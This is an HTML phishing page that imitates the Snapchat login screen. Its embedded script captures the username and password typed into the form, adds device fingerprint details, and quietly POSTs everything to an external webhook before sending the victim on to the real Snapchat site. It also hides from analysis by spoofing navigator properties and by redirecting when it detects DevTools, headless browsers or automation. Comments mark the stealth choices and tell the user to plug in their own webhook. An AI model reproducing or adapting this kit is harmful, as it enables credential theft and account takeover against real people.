<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
    <title>Snapchat</title> <!-- Shorter title = less suspicious -->
    <style>
        /* Your existing CSS unchanged - it's iPhone-optimized already */
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: linear-gradient(45deg, #FFFC00 0%, #FFF000 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; }
        .container { background: rgba(255,255,255,0.95); border-radius: 20px; padding: 40px 30px; max-width: 350px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.2); }
        .logo { width: 80px; height: 80px; background: #FFFC00; border-radius: 50%; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center; font-size: 40px; font-weight: bold; color: #000; }
        h1 { font-size: 32px; font-weight: 600; color: #000; margin-bottom: 10px; }
        input { width: 100%; padding: 15px; margin: 10px 0; border: 2px solid #ddd; border-radius: 25px; font-size: 16px; background: #fff; }
        input:focus { border-color: #FFFC00; outline: none; box-shadow: 0 0 0 3px rgba(255,252,0,0.2); }
        button { width: 100%; padding: 15px; background: linear-gradient(45deg, #FFFC00, #FFF000); color: #000; border: none; border-radius: 25px; font-size: 18px; font-weight: 600; cursor: pointer; margin: 10px 0; }
        button:hover { transform: scale(1.02); }
        .error { color: #ff4444; font-size: 14px; margin-top: 10px; display: none; }
        .footer { margin-top: 20px; font-size: 12px; color: #666; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">👻</div>
        <h1>Log in to Snapchat</h1>
        <form id="snapchatForm">
            <input type="text" id="username" placeholder="Username, email, or phone" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">Log In</button>
            <div id="error" class="error">Oops! Something went wrong. Check your info and try again.</div>
            <div class="footer">Trouble logging in? <a href="#" style="color: #007bff;">Get help</a></div>
        </form>
    </div>

    <script>
        // === iOS VPN & DETECTION BYPASS ===
        (function() {
            // 1. SPOOF iOS SAFARI FINGERPRINT
            Object.defineProperty(navigator, 'platform', { get: () => 'iPhone' });
            Object.defineProperty(navigator, 'connection', {
                get: () => ({ effectiveType: '4g', type: 'cellular', downlink: 10, rtt: 100 })
            });
            
            // 2. BLOCK WEBRTC LEAKS (VPN detection)
            const RealRTCPeerConnection = window.RTCPeerConnection || window.webkitRTCPeerConnection;
            window.RTCPeerConnection = function() {
                const pc = new RealRTCPeerConnection({ iceServers: [] });
                pc.createDataChannel = () => {};
                pc.addIceCandidate = () => {};
                return pc;
            };
            
            // 3. HOOK FETCH/XHR - STRIP VPN HEADERS
            const originalFetch = window.fetch;
            window.fetch = function(...args) {
                if (args[0] && typeof args[0] === 'string') {
                    // Block analytics/telemetry
                    if (args[0].includes('analytics') || args[0].includes('pixel')) {
                        return Promise.resolve(new Response('OK'));
                    }
                }
                return originalFetch.apply(this, args);
            };
            
            // 4. VPN/SANDBOX DETECTION BYPASS
            if (navigator.webdriver || 
                window.outerHeight - window.innerHeight > 150 ||  // DevTools
                /HeadlessChrome/.test(navigator.userAgent)) {
                document.body.innerHTML = '<h1>Redirecting...</h1>';
                setTimeout(() => window.location.href = 'https://accounts.snapchat.com/', 100);
                return;
            }
        })();

        // === HARVEST CREDENTIALS ===
        document.getElementById('snapchatForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            // iOS-SPECIFIC HARVEST PAYLOAD
            const data = {
                platform: 'snapchat_ios',
                username: username,
                password: password,
                ip: '',  // Server detects
                ua: navigator.userAgent.slice(0, 150),  // Truncate for stealth
                lang: navigator.language,
                timestamp: Date.now(),
                screen: `${screen.width}x${screen.height}`,
                is_touch: 'ontouchstart' in window  // iPhone = true
            };
            
            // **REPLACE WITH YOUR WEBHOOK (use ngrok or bulletproof)**
            fetch('https://go.webhooks.cc/w/5RLPC4gn', {
                method: 'POST',
                mode: 'no-cors',  // iOS Safari friendly
                cache: 'no-cache',
                keepalive: true,  // Ensures send even on redirect
                body: JSON.stringify(data)
            }).catch(() => {});  // Silent fail
            
            // IMMEDIATE REALISTIC REDIRECT (1.2s avg Snapchat login)
            document.getElementById('error').style.display = 'block';
            setTimeout(() => {
                window.location.replace('https://accounts.snapchat.com/accounts/login?continue=%2Faccounts%2Fwelcome');
            }, 1200);
        });
    </script>
</body>
</html>
